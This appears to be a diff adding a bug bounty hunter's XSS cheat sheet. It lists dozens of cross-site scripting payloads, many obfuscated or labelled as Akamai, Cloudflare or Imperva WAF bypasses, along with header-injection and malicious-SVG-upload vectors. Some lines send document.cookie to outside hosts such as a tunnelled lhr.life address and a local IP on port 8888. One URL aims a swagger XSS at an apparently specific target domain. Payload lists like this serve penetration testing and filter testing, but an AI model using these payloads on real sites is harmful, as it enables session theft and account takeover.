@@ -1,0 +1,130 @@
+"><ScRiPt>alert(document.cookie)</sCrIpT>
+
+"name":"test\"><payloads>"
+
+<dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>
+
+"><img src=x onerror=alert(document.cookie)>
+
+JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/alert(document.cookie)}//\76-->
+
+"><img/src/onerror=.1|alert`XSS-Found-by-F0XXTR0T` class=d>
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal#basic-exploitation
+
+<h1><i>Mr Bean: Hey naughty</i></h1><img src="https://www.outsideleft.com/i/stars/stewiekm.jpg" width="400" height="600">
+
+ <button onclick="window.location.href='https://www.google.com'">Click me</button>
+
+<img src=x onerror=this.src=‘http://192.168.0.18:8888/?’+document.cookie;>
+
+https://drive.google.com/drive/folders/14zlqgin6rUfr6jQRBCLbbP8P8Vdypz7x
+
+```"><img src=1 onerror=alert(1)> or "><img src=1 onerror=alert(document.cookie)>```
+
+"><A%20%252F=""Href=%20JavaScript:k=%27a%27,top[k%2B%27lert%27](origin)>
+
+Cloudflared
+"><img src=x onerrora=confirm() onerror=confirm(1)>
+
+touch '"><img src=x onerror=alert("xss!")>.pdf' fileupload
+
+<button onclick="window.location.href='https://67b0-2406-8800-80-859d-85bb-207d-1ea7-7e76.ngrok-free.app'">Click me</button
+
+```"><img src=1 onerror=document.location=“https://2737d51a05b8b0.lhr.life/?”+document.cookie>```
+
+"><img src=x onerror=alert(1)>
+
+"><img src=x onerror=prompt(/hello_pepsi/)>
+
+https://www.geeksforgeeks.org/tag/php-questions/page/7/?type="><img src=1 onerror=alert(1)>.gif
+
+Akamai bypass
+';k='e'%0Atop['al'*'k'+'rt'](1)//
+
+Cloudflared bypass
+<A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>
+
+<img+src%3dOnXSS+OnError%3dalert('XSs-Cloudflare-bypass-By-Dedi')>
+
+"><A%20%252F=""Href=%20JavaScript:k=%27a%27,top[k%2B%27lert%27](origin)>
+
+'<<k>/script><<k>script>eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))<<k>/script>
+
+‘>alert(154)<​/script><​script/154=’;;;;;;;
+
+<svg onload=alert&#0000000040"1")><””>
+
+"\/><img%20s+src+c=x%20on+onerror+%20="alert(1)"\>
+
+javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie
+
+"><input%252bTyPE%25253d"hxlxmj"%252bSTyLe%25253d"display%25253anone%25253b"%252bonfocus%25253d"this.style.display%25253d'block'%25253b%252bthis.onfocus%25253dnull%25253b"%252boNMoUseOVer%25253d"this['onmo'%25252b'useover']%25253dnull%25253beval(String.fromCharCode(99,111,110,102,105,114,109,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))%25253b"%252bAuToFOcus>
+
+%23%27%2Aprompt%281%29%2A%27
+
+For email
+a7madn1@gmail.com'\"><svg/onload=alert(/xss/)>
+
+Akamai bypass WAF
+1'"><A HRef=\" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](1)>
+
+"><a nope="%26quot;x%26quot;"onmouseover​="Reflect.get(frames,'ale'+'rt')(Reflect.get(document,'coo'+'kie'))">
+
+Via header injection
+X-Forwarded-For: '<svg onload=alert(document.domain)> 
+
+“><a href=“#” onmouseleave=alert(99)>click
+
+<svg/onload=eval(atob(‘YWxlcnQoJ1hTUycp’))>
+
+6'%22()%26%25%22%3E%3Csvg/onload​=prompt(document.domain)%3E/
+
+Simple URL encoded Payload
+%22%3E%3Cimg%20src=x%20onerror=alert(document.cookies)%3E
+
+'%3balert(String.fromCharCode(88,83,83))%2f%2f'%3balert(String.
+fromCharCode(88,83,83))%2f%2f"%3balert(String.fromCharCode
+(88,83,83))%2f%2f"%3balert(String.fromCharCode(88,83,83))%2f%2f--
+><%2fSCRIPT>">'><​SCRIPT>alert(String.fromCharCode(88,83,83)) <%2fSCRIPT>
+
+<div id="1"><svg><​style>&lt;img/src=x onerror​=alert(document.domain)// </b>//["'`-->
+ 
+<svg onload​=prompt&#0000000040document.domain)> Hex: <svg onload​=prompt&#x000000028;document.domain)>
+
+XSS in Swagger
+
+https://notification.uat.tensai.run//swagger/index.html?configUrl=https://xss.smarpo.com/test.json
+
+Phone number payload
+10203040;𝐩𝐡𝐨𝐧𝐞-𝐜𝐨𝐧𝐭𝐞𝐱𝐭=<𝐬𝐜𝐫𝐢𝐩𝐭>𝐚𝐥𝐞𝐫𝐭(1)</𝐬𝐜𝐫𝐢𝐩𝐭>
+
+1- when exist url filter and filter remove (<,>,%22,%3e,%3c,”) from payloads try use multiple parameter like domain?q=test&q=test%22{xss payload} to bypass filter 
+
+2- to bypass WAF use function or condition to excute alert 
+Example: 
+domain?q=test%22%3e%3c&q=”;var%20a=3;if(a==3){alert(document.cookie);}//
+
+XSS via file upload
+
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+  <script type="text/javascript">
+    alert("XSS by PAXNULL");
+  </script>
+</svg>
+Blind XSS to SSRF via file upload
+https://gist.github.com/ioribrn/aafd49c7c3a5cc7e1ba4848b75a52f4b
+
+Akamai Imperva Cloudflare bypass XSS
+<A HRef=//site.com AutoFocus %26%2362 OnFocus%0C=import(href)>
+
+Iframe injection
+<iframe srcdoc​="&lt;img src&equals;x:x onerror&equals;alert&lpar;document.cookie&rpar;&gt;" />
+
+testtest”+onmouseover%3D”alert%26%230000000040%3Bdocument[‘cookie’])
+
+<​style>@keyframes a{}b{animation:a;}<​/style><b/onanimationstart​=prompt`${document.domain}&#x60;>
